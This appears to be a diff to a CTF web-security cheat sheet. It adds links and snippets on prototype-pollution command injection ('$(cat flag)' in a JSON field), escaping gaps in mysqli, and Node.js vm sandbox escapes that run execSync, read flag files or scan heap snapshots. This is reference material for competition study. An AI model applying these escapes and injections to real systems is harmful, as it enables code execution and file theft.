@@ -139,6 +139,11 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
     - https://blog.redteam.pl/2020/08/rocket-chat-xss-rce-cve-2020-15926.html
     - [#276031 Remote Code Execution in Rocket.Chat Desktop - HackerOne](https://hackerone.com/reports/276031)
 
+Clone:
+
+- `{"name":"a","__proto__":{"country":"'$(cat flag)'"}}`
+    - https://sasdf.github.io/ctf/writeup/2018/defcamp/web/chat/
+
 # HTTP Parameter Pollution
 
 - http://www.benhayak.com/2019/07/blog-post.html
@@ -638,6 +643,10 @@ for i in xrange(1, 50):
 ```
     - https://www.40huo.cn/blog/0ctf-2017-writeup.html
 
+- `mysqli::real_escape_string`
+    - does not escape backtick, `--`
+    - https://sasdf.github.io/ctf/writeup/2019/google/web/glotto/
+
 - https://medium.com/@gregIT/ringzer0team-ctf-sqli-challenges-part-2-b816ef9424cc
 
 # NoSQL Injection
@@ -747,6 +756,12 @@ nginx:
     foo
     undefined
     ```
+- [CTFtime\.org / Harekaze CTF 2019 / /\(a\-z\(\)\.\)/ / Writeup](https://ctftime.org/writeup/15376)
+    - [Harekaze 2019 writeups by terjanq \(https://twitter\.com/terjanq\) · GitHub](https://gist.github.com/terjanq/a571826c6bb08ae0dfa4ef57e03b5b72)
+    ```javascript
+    (typeof(x)).constructor((typeof(x)).big.name.length).concat(
+    (typeof(x)).constructor((typeof(x)).big.name.length)) // "33"
+    ```
 - sandbox escape
     - if: all objects inside VM context
     - then:
@@ -765,10 +780,42 @@ nginx:
         }
         ```
     - else: use `this`
-    - https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html
-    ```javascript
-    this.constructor.constructor('return this.process')().mainModule.require("child_process").execSync('cat * | grep CSR')
-    ```
+        - https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html
+        ```javascript
+        this.constructor.constructor('return this.process')().mainModule.require("child_process").execSync('cat * | grep CSR')
+        ```
+    - [Escaping nodejs vm · GitHub](https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af)
+    - [CTFtime\.org / SECCON 2020 Online CTF / Capsule / Writeup](https://ctftime.org/writeup/24124)
+        - [V8's inspector API](https://chromedevtools.github.io/devtools-protocol/) from [Node.js](https://nodejs.org/api/inspector.html)
+            ```javascript
+            global.flag = flag;
+            const inspector = require('inspector');
+            const session = new inspector.Session();
+            session.connect();
+            session.post('Runtime.evaluate', {expression: 'flag'}, (e, d) => {
+              session.post('Runtime.getProperties', {objectId: d.result.objectId}, (e, d) => {
+                console.log(d.privateProperties[0].value.value);
+              });
+            });
+            ```
+        - [Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
+            ```javascript
+            const fs = require('fs');
+            // require() defined in node, but shadowed
+            function require() {
+              const fs = process.mainModule.require('fs');
+              console.log(fs.readFileSync('flag.txt').toString());
+            }
+            ```
+        - https://nodejs.org/api/v8.html#v8_v8_getheapsnapshot
+            ```javascript
+            const v8 = require('v8');
+            const memory = v8.getHeapSnapshot().read();
+            const index = memory.indexOf('SEC' + 'CON');
+            const len = memory.slice(index).indexOf('}');
+            const flagBuffer = memory.slice(index, index + len + 1);
+            console.log(flagBuffer.toString());
+            ```
 - alternative for `child_process`
     - https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html
     - https://github.com/nodejs/node/blob/master/lib/internal/child_process.js
@@ -837,6 +884,7 @@ nginx:
     - https://owasp.org/www-community/attacks/Cache_Poisoning
 - https://haboob.sa/ctf/nullcon-2019/babyJs.html
     - [Breakout in v3\.6\.9 · Issue \#186 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/186)
+    - [Escaping the vm sandbox · Issue \#32 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/32)
 - redirect given appended string
     - `foo.com?var=`
     - `foo.com\r\nFoo-Header:`
